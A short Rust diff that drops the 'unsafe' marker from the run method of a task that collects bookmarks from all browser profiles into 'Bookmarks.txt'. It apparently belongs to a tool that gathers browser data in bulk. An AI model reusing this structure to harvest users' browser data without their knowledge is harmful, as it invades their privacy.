@@ -23,7 +23,7 @@ impl BookmarksTask {
 impl<C: Collector> Task<C> for BookmarksTask {
     parent_name!("Bookmarks.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks) else {
             return
         };
